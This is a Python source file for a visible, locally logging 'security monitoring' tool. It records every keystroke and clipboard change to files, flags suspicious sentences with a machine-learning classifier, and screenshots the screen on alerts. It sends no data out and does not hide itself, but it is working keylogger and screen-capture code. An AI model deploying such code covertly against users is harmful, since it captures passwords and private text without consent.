from pynput.keyboard import Listener, Key
from datetime import datetime
import pyperclip
import time
import threading
import os
import sys
from PIL import ImageGrab
import traceback
from config import LOG_FILE, ALERT_FILE, CLIPBOARD_LOG_FILE, SCREENSHOT_DIR, MODEL_FILE

try:
    from detection import check_sentence, log_alert, explain_detection
except UnicodeError:
    print("Warning: Unicode character issue in detection module")


# Buffer 
current_sentence = []
last_checked_text = ""
buffer_timeout = 0  # Timer to check sentence


def safe_check_sentence(text):
    """Wrapper around check_sentence to handle Unicode errors"""
    try:
        # Try using the original function
        from detection import check_sentence
        return check_sentence(text)
    except UnicodeError:
        # Fall back to our  implementation
        try:
            import joblib
            import re
            import os
            
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            model_path = MODEL_FILE

            
            # Load model i
            if not hasattr(safe_check_sentence, 'model'):
                safe_check_sentence.model = joblib.load(model_path)
            
            #cleaning
            cleaned = text.strip().lower()
            if not cleaned:
                return False
                
            # prediction
            proba = safe_check_sentence.model.predict_proba([cleaned])[0]
            suspicious_idx = list(safe_check_sentence.model.classes_).index('suspicious')
            suspicious_confidence = proba[suspicious_idx]
            
            #threshold
            is_suspicious = suspicious_confidence > 0.5
            
            if is_suspicious:
                # Log result
                print(f"Suspicious activity detected: '{cleaned}' (confidence: {suspicious_confidence*100:.1f}%)")
                
            return is_suspicious
        except Exception as e:
            print(f"Error in safe_check_sentence: {e}")
            traceback.print_exc()
            return False

# Safe version
def safe_log_alert(activity):
    try:
        log_file = ALERT_FILE
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[ALERT] {datetime.now()} → {activity}\n")
        print(f"Alert logged: {activity}")
    except Exception as e:
        print(f"Error in safe_log_alert: {e}")

# Safe version of explain_detection
def safe_explain_detection(text):
    """Wrapper around explain_detection to handle Unicode errors"""
    try:
        # Try using the original function
        from detection import explain_detection
        return explain_detection(text)
    except UnicodeError:
        #  simple explanation
        return "This text contains potentially sensitive information."

def log_keypress(text):
    """Log the current text to the file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} - {text}\n")

def check_suspicious_text(text):
    """Check if text is suspicious and take appropriate actions"""
    global last_checked_text
    
    # Cleaning up
    cleaned_text = text.strip()
    
    # Skip if empty 
    if not cleaned_text or cleaned_text == last_checked_text:
        return False
    
    # Update last checked text
    last_checked_text = cleaned_text
    
    # Check for suspicious content
    if safe_check_sentence(cleaned_text):
        safe_log_alert(cleaned_text)
        explanation = safe_explain_detection(cleaned_text)
        print(f"ALERT: Suspicious activity detected!")
        print(f"TEXT: {cleaned_text}")
        print(f"REASON: {explanation}")
        take_screenshot()
        return True
    return False

def on_press(key):
    global current_sentence, last_checked_text, buffer_timeout

    try:
        # character keys
        if hasattr(key, 'char') and key.char is not None:
            current_sentence.append(key.char)

        elif key == Key.space:
            current_sentence.append(' ')

        elif key == Key.enter:
            sentence = ''.join(current_sentence).strip()
            check_suspicious_text(sentence)

            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write("[ENTER]\n")

            current_sentence = []

        elif key == Key.backspace:
            if current_sentence:
                current_sentence.pop()

        elif key == Key.tab:
            current_sentence.append('\t')

        elif key == Key.esc:
            print("Keylogger stopped by user.")
            return False

        # Log keypress 
        log_keypress(''.join(current_sentence))

    except Exception as e:
        print(f"Error in keylogger: {e}")


def clipboard_logger():
    last_clipboard = ""
    clipboard_check_count = 0
    clipboard_log_file = CLIPBOARD_LOG_FILE


    while True:
        try:
            current_clipboard = pyperclip.paste()
            
            # Only log if content changed 
            clipboard_check_count += 1
            if (current_clipboard and current_clipboard != last_clipboard) or clipboard_check_count >= 15:
                clipboard_check_count = 0
                
                # Log clipboard content 
                if current_clipboard != last_clipboard:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open(clipboard_log_file, "a", encoding="utf-8") as f:
                        f.write(f"{timestamp} - {current_clipboard}\n")
                    
                    # Store last clipboard 
                    last_clipboard = current_clipboard
         
            
                if current_clipboard and check_suspicious_text(f"CLIPBOARD: {current_clipboard}"):
                    
                    pass
                    
        except Exception as e:
            print(f"Clipboard logger error: {e}")
        time.sleep(1)  # Check clipboard once per second

def take_screenshot():
    """Take a screenshot when suspicious activity is detected"""
    screens_dir = SCREENSHOT_DIR
    if not os.path.exists(screens_dir):
        os.makedirs(screens_dir)
        
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = os.path.join(screens_dir, f"screenshot_{timestamp}.png")
    
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        print(f"Screenshot saved: {screenshot_path}")
    except Exception as e:
        print(f"Error taking screenshot: {e}")

def setup_environment():

    """Setup logging environment and initial files"""
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"Keylogger started at {datetime.now()}\n")

    if not os.path.exists(CLIPBOARD_LOG_FILE):
        with open(CLIPBOARD_LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"Clipboard monitoring started at {datetime.now()}\n")

    if not os.path.exists(SCREENSHOT_DIR):
        os.makedirs(SCREENSHOT_DIR)

    if not os.path.exists(ALERT_FILE):
        with open(ALERT_FILE, "w", encoding="utf-8") as f:
            f.write(f"Alert logging started at {datetime.now()}\n")

            
    # Test detection system
    print("Testing detection system...")
    test_texts = [
        "My password is admin123",
        "Let's bypass the security system"
    ]
    for test in test_texts:
        if safe_check_sentence(test):
            print(f"Detection test passed for: '{test}'")
        else:
            print(f"Detection test failed for: '{test}' - This should have been flagged!")

if __name__ == "__main__":
    # Setting up theeenvironment and test detection system
    setup_environment()
    
    print("----------------------------------------")
    print("Advanced Security Monitoring Started")
    print("Monitoring keystrokes and clipboard...")
    print("Press Esc to stop.")
    print("----------------------------------------")
    
    # Start clipboard logger in background
    clipboard_thread = threading.Thread(target=clipboard_logger, daemon=True)
    clipboard_thread.start()
    
    # Start keyboard listener
    with Listener(on_press=on_press) as listener:
        listener.join()
